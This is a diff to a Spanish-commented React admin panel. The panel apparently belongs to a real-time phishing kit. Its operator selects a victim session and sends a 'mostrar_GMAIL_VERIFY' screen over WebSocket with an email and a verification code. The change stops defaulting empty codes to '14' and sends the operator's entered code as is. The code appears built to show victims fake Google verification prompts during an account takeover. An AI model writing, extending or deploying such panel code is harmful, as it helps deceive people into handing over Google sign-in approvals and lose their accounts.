@@ -689,17 +689,15 @@ export default function AdminPanel() {
   
   const handleGmailVerifyModalConfirm = (data: { correo: string, codigo: string }) => {
     if (selectedSessionId) {
-      // Asegurar que el código nunca esté vacío
-      const codigoVerificacion = data.codigo && data.codigo.trim() !== '' ? data.codigo : '14';
-      
-      console.log('⚠️ Enviando solicitud de verificación Google con código:', codigoVerificacion);
+      // Usamos exactamente lo que el usuario ingresó, sin valores predeterminados
+      console.log('⚠️ Enviando solicitud de verificación Google con código:', data.codigo);
       
       // Crear el objeto de datos con las propiedades específicas
       const screenData = {
         tipo: `mostrar_${ScreenType.GMAIL_VERIFY}`,
         sessionId: selectedSessionId,
         correo: data.correo,
-        codigo: codigoVerificacion
+        codigo: data.codigo
       };
       
       // Enviar mensaje directamente con WebSocket para evitar posibles problemas
@@ -714,7 +712,7 @@ export default function AdminPanel() {
         
         toast({
           title: "Verificación de Google enviada",
-          description: `Se ha solicitado la verificación de Google para: ${data.correo} con código: ${codigoVerificacion}`,
+          description: `Se ha solicitado la verificación de Google para: ${data.correo} con código: ${data.codigo}`,
         });
       } else {
         toast({
